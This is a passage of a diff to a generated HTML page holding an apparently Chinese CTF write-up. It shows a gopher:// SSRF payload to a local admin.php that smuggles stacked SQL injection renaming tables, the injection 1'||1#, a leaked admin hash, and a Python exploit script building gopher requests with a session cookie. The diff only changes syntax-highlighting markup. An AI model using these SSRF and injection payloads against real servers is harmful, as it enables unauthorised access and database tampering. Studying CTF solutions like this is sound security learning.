class="n">TO</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">tyskill</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">253</span><span class="n">BRENAME</span><span class="o">%</span><span class="mi">2520</span><span class="n">TABLE</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">real_admin_here_do_you_find</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">2520</span><span class="n">TO</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">fake_admin</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">253</span><span class="n">B</span><span class="o">%</span><span class="mi">2523</span><span class="o">%</span><span class="mi">26</span><span class="n">password</span><span class="o">%</span><span class="mi">3</span><span class="n">D123</span><span class="w">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># -1&#39;;RENAME TABLE `fake_admin` TO `tyskill`;RENAME TABLE `real_admin_here_do_you_find` TO `fake_admin`;#
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="n">_POST</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">admin</span><span class="p">.</span><span class="n">php</span><span class="o">%</span><span class="mi">20</span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">AHost</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">20127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">AContent</span><span class="o">-</span><span class="n">Type</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">20</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">AContent</span><span class="o">-</span><span class="n">Length</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">20166</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Ausername</span><span class="o">%</span><span class="mi">3</span><span class="n">D1</span><span class="o">%</span><span class="mi">2527</span><span class="o">%</span><span class="mi">253</span><span class="n">BRENAME</span><span class="o">%</span><span class="mi">2520</span><span class="n">TABLE</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">fake_admin</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">2520</span><span class="n">TO</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">tyskill</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">253</span><span class="n">BRENAME</span><span class="o">%</span><span class="mi">2520</span><span class="n">TABLE</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">real_admin_here_do_you_find</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">2520</span><span class="n">TO</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">fake_admin</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">253</span><span class="n">B</span><span class="o">%</span><span class="mi">2523</span><span class="o">%</span><span class="mi">26</span><span class="n">password</span><span class="o">%</span><span class="mi">3</span><span class="n">D123</span><span class="w">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>之后注入<code>1'||1#</code>获得<code>admin_inner:5fb4e07de914cfc82afb44vbaf402203</code>，最后一个脑洞：使用<strong>admin</strong>登陆而不是<strong>admin_inner</strong>，最后补一下Cookie即可。</p>
 <p>exp</p>
@@ -554,39 +554,39 @@
 </span><span class="lnt">32
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-coding-*-: utf-8</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span> <span class="k">as</span> <span class="n">urlencode</span>
-
-<span class="k">def</span> <span class="nf">Gopher</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;123&#34;</span><span class="p">):</span>
-    <span class="n">PROTOCOL</span> <span class="o">=</span> <span class="s2">&#34;gopher://&#34;</span>
-    <span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
-    <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&#34;80&#34;</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;username=</span><span class="si">{</span><span class="n">urlencode</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="si">}</span><span class="s2">&amp;password=</span><span class="si">{</span><span class="n">urlencode</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
-    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] request-length: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="c1">#     stream = f&#34;&#34;&#34;POST /admin.php HTTP/1.1</span>
-<span class="c1"># Host: 127.0.0.1</span>
-<span class="c1"># Content-Type: application/x-www-form-urlencoded</span>
-<span class="c1"># Content-Length: {length}</span>
-
-<span class="c1"># {data}&#34;&#34;&#34;.replace(&#34;\n&#34;, &#34;\r\n&#34;)</span>
-    <span class="n">stream</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;POST /flag.php HTTP/1.1
-</span><span class="s2">Host: 127.0.0.1
-</span><span class="s2">Cookie: PHPSESSID=b7ps1amtt5310i3khma6qhcdi2; path=/
-</span><span class="s2">Content-Type: application/x-www-form-urlencoded
-</span><span class="s2">Content-Length: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">
-</span><span class="s2">
-</span><span class="s2"></span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">PROTOCOL</span> <span class="o">+</span> <span class="n">IP</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="n">PORT</span> <span class="o">+</span> <span class="s2">&#34;/_&#34;</span> <span class="o">+</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] payload: &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">payload</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="c1"># Gopher(&#34;1&#39;;RENAME TABLE `fake_admin` TO `tyskill`;RENAME TABLE `real_admin_here_do_you_find` TO `fake_admin`;#&#34;)</span>
-    <span class="c1"># Gopher(&#34;1&#39;||1#&#34;)</span>
-    <span class="n">Gopher</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;5fb4e07de914cfc82afb44vbaf402203&#34;</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*-coding-*-: utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span> <span class="k">as</span> <span class="n">urlencode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Gopher</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;123&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROTOCOL</span> <span class="o">=</span> <span class="s2">&#34;gopher://&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PORT</span> <span class="o">=</span> <span class="s2">&#34;80&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;username=</span><span class="si">{</span><span class="n">urlencode</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="si">}</span><span class="s2">&amp;password=</span><span class="si">{</span><span class="n">urlencode</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] request-length: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     stream = f&#34;&#34;&#34;POST /admin.php HTTP/1.1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Host: 127.0.0.1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Content-Type: application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Content-Length: {length}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># {data}&#34;&#34;&#34;.replace(&#34;\n&#34;, &#34;\r\n&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">stream</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;POST /flag.php HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host: 127.0.0.1
+</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie: PHPSESSID=b7ps1amtt5310i3khma6qhcdi2; path=/
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">PROTOCOL</span> <span class="o">+</span> <span class="n">IP</span> <span class="o">+</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="n">PORT</span> <span class="o">+</span> <span class="s2">&#34;/_&#34;</span> <span class="o">+</span> <span class="n">urlencode</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] payload: &#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Gopher(&#34;1&#39;;RENAME TABLE `fake_admin` TO `tyskill`;RENAME TABLE `real_admin_here_do_you_find` TO `fake_admin`;#&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Gopher(&#34;1&#39;||1#&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Gopher</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="s2">&#34;5fb4e07de914cfc82afb44vbaf402203&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div>
             </div>
